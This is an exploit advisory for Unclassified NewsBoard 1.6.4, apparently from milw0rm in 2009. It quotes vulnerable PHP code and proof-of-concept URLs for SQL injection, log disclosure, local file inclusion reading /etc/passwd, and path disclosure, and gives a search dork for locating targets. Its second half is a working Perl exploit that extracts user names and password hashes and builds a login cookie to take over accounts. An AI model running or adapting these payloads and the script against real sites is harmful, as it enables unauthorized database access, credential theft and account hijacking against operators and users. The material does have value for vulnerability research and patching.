@@ -1,0 +1,413 @@
+# Author_	girex
+# Homepage_	girex.altervista.org
+# Date_		31/05/2009
+
+# CMS_		Unclassified NewsBoard 1.6.4 (and maybe lower)
+# Dork_		"This board is powered by the Unclassified NewsBoard software, 1.6.4"
+
+# Multiple remote vulnerabilities
+
+# 1) Remote SQL Injection 				(php.ini regardless)
+# 2) Logs File Disclosure 				(register_globals = On)
+# 3) Local File Inclusion / Remote Command Execution	(register_globals = On / magic_quotes_gpc = Off)
+# 4) Full Path Disclosure				
+
+#################################################################################
+
+# 1) Remote SQL Injection 
+# Works regardless of php.ini settings
+
+# File: /unb_lib/common.lib.php - Lines: 78-103
+
+if (get_magic_quotes_gpc())
+{
+	#$mq_old = array('\\\'', '\\"', '\\\\', '\\0');
+	#$mq_new = array('\'',   '"',   '\\',   '');
+	foreach ($_GET as $key => $value)
+	{
+		if (is_string($_GET[$key])) $_GET[$key] = stripslashes($value);
+	}
+	foreach ($_POST as $key => $value)
+	{
+		#if (!is_array($_POST[$key])) $_POST[$key] = str_replace($mq_old, $mq_new, $value);
+		if (is_string($_POST[$key])) $_POST[$key] = stripslashes($value);
+	}
+	foreach ($_REQUEST as $key => $value)
+	{
+		if (is_string($_REQUEST[$key])) $_REQUEST[$key] = stripslashes($value);
+	}
+	foreach ($_COOKIE as $key => $value)
+	{
+		if (is_string($_COOKIE[$key])) $_COOKIE[$key] = stripslashes($value);
+	}
+	foreach ($_FILES as $key => $value)
+	{
+		$_FILES[$key]['name'] = stripslashes($value['name']);
+	}
+}
+
+# If magic_quotes_gpc are set to On it stripslash all input variables, so we don't need mq = off.
+# Now the vars are sanizated for SQL queries with UnbDbEncode function in database.lib.php
+
+# File: /unb_lib/database.lib.php - Lines: 805-825
+
+function UnbDbEncode($str, $forLIKE = false)
+{
+	// Clean parameters
+	$str = strval($str);
+
+	$str = str_replace('\\', '\\\\', $str);	   		<==  escape backslash
+	$str = str_replace('\'', '\\\'', $str);    		<==  escape quote
+	#$str = str_replace('\'', '\'\'', $str);  
+	$str = str_replace('"', '\\"', $str);	   		
+	$str = str_replace("\n", '\\n', $str);
+	$str = str_replace("\r", '\\r', $str);
+	$str = str_replace("\t", '\\t', $str);
+
+	if ($forLIKE)
+	{
+		$str = str_replace('\\', '\\\\', $str);		<== this is wrong, delete the escaping of the quote for example
+		$str = str_replace('%', '\\%', $str);
+		$str = str_replace('_', '\\_', $str);
+	}
+	return $str;
+}
+
+# As you can see, if $forLIKE is set to true the effect of the escaping is vanificated
+# '  => \' => (if $forLIKE == true) => \\'
+
+# File: /unb_lib/search.inc.php - lines: 
+
+		if ($_REQUEST['InSubject'] || $_REQUEST['InMessage'])
+		{
+			$highlight = array();
+			$words = explode_quoted(' ', $_REQUEST['Query']);      <== 
+			...
+			foreach ($words as $word)
+			{
+				if ($word != '')
+				{
+					...
+					// case-insensitive search
+					$in_subject .= '(p.Subject LIKE \'%' . UnbDbEncode($word, true) . '%\' OR ' . 		<==
+						't.Desc LIKE \'%' . UnbDbEncode($word, true) . '%\' AND p.Date = t.Date)';
+					...	
+					$in_message .= '(p.Msg LIKE \'%' . UnbDbEncode($word, true) . '%\')';	<== vuln sanizating
+					// this doesn't work:
+					...
+					$query .= '(';
+					if ($_REQUEST['InSubject']) $query .= $in_subject;
+					if ($_REQUEST['InSubject'] && $_REQUEST['InMessage']) $query .= ($not ? ' AND ' : ' OR ');
+					if ($_REQUEST['InMessage']) $query .= $in_message;
+					$query .= ')';
+
+	......
+
+	if (!$error)
+	{
+		$record = $UNB['Db']->FastQuery(			<== vuln query
+			/*table*/ array(
+				array('', 'Posts', 'p', ''),
+				array('LEFT', 'Threads', 't', 'p.Thread = t.ID')),
+			/*fields*/ $_REQUEST['ResultView'] == 1 ?
+				't.ID, t.Forum' :
+				'p.ID, t.ID, t.Forum',
+			/*where*/ $query,
+			/*order*/ '',
+			/*limit*/ '',
+			/*group*/ $_REQUEST['ResultView'] == 1 ? 't.ID' : '');
+
+
+# $_REQUEST['Query'] var is 'sanizated' with the bugged function UnbDbDecode so we can manipulate the query.
+
+# PoC: [host]/[path]/forum.php?req=search&Query=xxx'))OR/**/1=1%23&ResultView=2&InMessage=1&Sort=2&Forum=0
+
+#################################################################################
+
+# 2) Logs file disclosure
+# Need register_globals = On
+
+# File: /unb_lib/common.lib.php  -  lines: 127-135
+
+// unregister_globals :) for more security (except for install/import scripts)
+if (ini_get('register_globals') && !$UNB['Installing'])
+{
+	if (sizeof($_SESSION)) foreach (array_keys($_SESSION) as $key) unset($$key);
+	if (sizeof($_GET)) foreach (array_keys($_GET) as $key) unset($$key);
+	if (sizeof($_POST)) foreach (array_keys($_POST) as $key) unset($$key);
+	if (sizeof($_COOKIE)) foreach (array_keys($_COOKIE) as $key) unset($$key);
+	if (sizeof($_SERVER)) foreach (array_keys($_SERVER) as $key) unset($$key);
+}
+
+# This is simply bypassable using and defining global vars via GLOBALS array
+# like forum.php?GLOBALS[var]=value
+
+# Now let's see rss.inc.php
+# File: /unb_lib/rss.inc.php  -  lines: 69-77
+
+$type = $_REQUEST['type'];
+...
+if ($type == 1)
+	$filename = strtolower(str_replace('.', '', $format)) . '.' . $forumid . '.xml';
+if ($type == 2)
+	$filename = strtolower(str_replace('.', '', $format)) . '.allposts.xml';
+
+$filename = dirname(__FILE__) . '/rsscache/' . $filename;
+
+$rss = new UniversalFeedCreator();
+if ($cache_time) $rss->useCached($format, $filename, $cache_time);   	<== vuln function
+
+# If type is set for example to 3, we can define $filename
+
+# File: /unb_lib/feedcreator.lib.php  
+
+	function useCached($filename="", $timeout=3600) {
+		$this->_timeout = $timeout;
+		if ($filename=="") {
+			$filename = $this->_generateFilename();
+		}
+		if (file_exists($filename) AND (time()-filemtime($filename) < $timeout)) {
+			$this->_redirect($filename);			<== vuln function
+		}
+	}
+
+# NOTE: the file as you can see must be edited in the last hour
+	...
+
+	function _redirect($filename) {
+
+		Header("Content-Type: ".$this->contentType."; charset=".$this->encoding."; filename=".basename($filename));
+		Header("Content-Disposition: inline; filename=".basename($filename));
+		readfile($filename, "r");				<== here local file disclosure			
+		die();
+	}
+
+# NOTE: the file as you can see must be edited in the last hour
+# So it is only usefull to see log's files. (we can't access them directly couse use of .htaccess)
+
+# PoC: [host]/[path]/forum.php?req=rss&type=3&forum=1&GLOBALS[filename]=../logs/board-yyyy-mm-dd.log
+# Where yyyy-mm-gg are the current year month and day.
+
+#################################################################################
+
+# 3) Local file inclusion / Remote command execution
+# Need register_globals = On and magic_quotes_gpc = Off
+
+# File: /unb_lib/ute.runtime.lib.php - lines: 
+
+function UteShowAll()
+{
+	global $UTE;
+
+	if (!isset($UTE['__tplCollection']) || !is_array($UTE['__tplCollection'])) return;
+	
+	foreach ($UTE['__tplCollection'] as $tpl)
+	{
+	
+		UteShow($tpl['file'], $tpl['params']);
+	}
+	$UTE['__tplCollection'] = null;
+}
+
+# UteShowAll is called to include local templates.. 
+# But $UTE array is not properly inizialitizated..
+# So $UTE['__tplCollection'] array is writable via GLOBALS trick so let's see UteShow function...
+
+function UteShow($file, &$params)
+{
+	global $UTE;
+
+	$sourceFile = $UTE['__sourcePath'] . '/' . $file;
+	$cacheFile = $UTE['__cachePath'] . '/' . $file . '.php';	<== vulnerable variable
+
+	...
+
+	if ($UTE['__haltOnFileError'] && !file_exists($cacheFile) && !is_readable($cacheFile))
+		die('<b>UTE error:</b> cannot include template "' . $file . '", does not exist or is not readable<br />');
+
+	$ret = include($cacheFile);		<== vulnerable inclusion
+	if (!$ret)
+		die('<b>UTE error:</b> error including template "' . $file . '"<br />');
+
+	...
+	return true;
+}
+
+# So there is a local file inclusion working with rg = on and mq = off couse use of nullbyte
+
+# PoC: [host]/[path]/forum.php?GLOBALS[UTE][__tplCollection][a][file]=../../../../../../../../../../../../etc/passwd%00
+
+# NOTE: you can obatin a Remote Command Execution:
+
+  - injecting php code in log's file and including it.
+  - uploading an attachment in your topic with malicious code.
+  - uploading an avatar with malicios code in exif data.
+
+#################################################################################
+
+# 4) Full path disclosure
+
+# Finally to get a simply full path disclosure make this request:
+# /[host]/[path]/extra/import/import_wbb1.php
+
+
+#################################################################################
+########################## Remote SQL Injection Exploit #########################
+#################################################################################
+
+#!/usr/bin/perl
+# Unclassified NewsBoard 1.6.4 Remote SQL Injection Exploit
+# Coded by girex
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+
+if(not defined $ARGV[0])
+{
+	print "\nusage: perl $0 <host> <path>\n";
+	print "example: perl $0 localhost /unb/\n\n";
+	exit;
+} 
+
+my $lwp = new LWP::UserAgent;
+my $cookie_jar =  new HTTP::Cookies;
+
+$lwp->cookie_jar($cookie_jar);
+$lwp->default_header('Accept-Language: en-us,en;q=0.5');
+$lwp->agent('User-Agent: Mozilla/5.0 (X11; U; Linux; it; rv:1.9.0.10) Firefox/3.0.10');
+
+
+my $target  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
+   $target .=  $ARGV[1] unless not defined $ARGV[1];
+   $target .= '/' unless $target =~ /\/$/;
+
+banner();
+my $id = '1';					# change if need
+my $default_prefix = 'unb1';			# change if need
+my $abs_path = get_abs_path();  		# using path disclosure bug
+my $cookie_prefix = get_cookie_prefix();	# getting cookie prefix and session
+
+print "[+] Path disclosure: $abs_path\n" if defined $abs_path;
+
+$injection = "-1) AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,table_name,".
+	     "12,13,14,15,16,17,18,19 FROM information_schema.tables WHERE table_name LIKE '%_GroupMembers' LIMIT 0,1#";
+
+$table_name = make_inj($injection); 
+
+if(defined $table_name and $table_name =~ /(\w+)_GroupMembers/)
+{ 
+	$prefix = $1;
+	print "[+] Found table prefix via information schema: ${prefix}_\n\n";
+}
+else
+{
+	$prefix = $deafult_prefix;
+}	
+
+# Change this query if need
+$injection = "-1) AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,10,concat(Name,0x3a,Password),".
+	     "12,13,14,15,16,17,18,19 FROM ${prefix}_Users WHERE ID=${id} OR 1 LIMIT 0,1#";
+
+$login = make_inj($injection);
+
+if(defined $login)
+{
+	($username, $hash) = split(':', $login,2);
+	print "[+] Username: $username\n[+] Hash: $hash\n\n";
+
+	if(length($hash) == 32)
+	{
+		$cookie = "UnbUser-${cookie_prefix}=${id}+${hash}";
+		print "[+] Password is hashed in md5 use this cookie to authenticate:\n";
+		print "[+] Cookie: $cookie\n\n";
+	}
+	elsif(length($hash) == 34)
+	{
+		print "[-] Hash retrieved is NOT a md5, so can't retrieve cookie to authenticate.\n";
+		print "[-] See the source to know how to bruteforce it\n\n";
+	}
+	else
+	{
+		$password = $1 if $hash =~ /\{(.+)\}/;
+		print "[+] Password is in plain-text use $username and $password to login!\n\n";
+	}
+}
+else
+{
+	print "[-] Unable to retrieve user's hash, probably wrong prefix\n\n";
+}
+
+sub get_abs_path()
+{
+	my $res = $lwp->get($target.'extra/import/import_wbb1.php');
+	
+	if($res->is_error)
+	{
+		return undef;
+	}
+
+	if($res->content =~ /in <b>(.*)extra\/import\/import_wbb1.php<\/b> on line/)
+	{
+		return $1;
+	}
+
+	return $undef;
+}
+
+sub get_cookie_prefix()
+{
+	my $res = $lwp->get($target.'forum.php');
+
+	if($res->is_error)
+	{
+		print "[-] Unable to request ${target}forum.php\n";
+		print "[-] ". $res->status_line."\n\n";
+		exit;
+	}
+	
+	if($res->as_string =~ /Set-Cookie: unb(\d+)sess=(\w{32})/)
+	{
+		$v = $1;
+		$val = $2;
+	}
+
+	return "unb${v}";
+}
+
+sub make_inj()
+{
+	my $inj = hex_str(shift);
+	my $final_inj = "1')AND(1=2))UNION/**/SELECT/**/$inj,-1111,-1111%23";
+
+	my $res = $lwp->get($target."forum.php?req=search&Query=${final_inj}&ResultView=2&InMessage=1&Forum=0&set_lang=en");
+
+	if($res->is_error)
+	{
+		print "[-] ". $res->status_line . "\n\n";
+		exit;
+	}
+
+	if($res->content =~ /<small>Subject:<\/small> <b>(.+)<\/b>/)
+	{
+		return $1;
+	}
+
+	open(DEBUG, '>', 'debug.htm');
+	print DEBUG $res->content;
+	close(DEBUG);
+
+	return undef;
+}
+
+sub hex_str()
+{
+	return '0x'. unpack("H*", shift);
+}
+
+sub banner()
+{
+	print "\n[+] Unclassified NewsBoard 1.6.4 Remote SQL Injection Exploit\n";
+	print "[+] Coded by girex\n\n";
+}
+
+# milw0rm.com [2009-06-01]
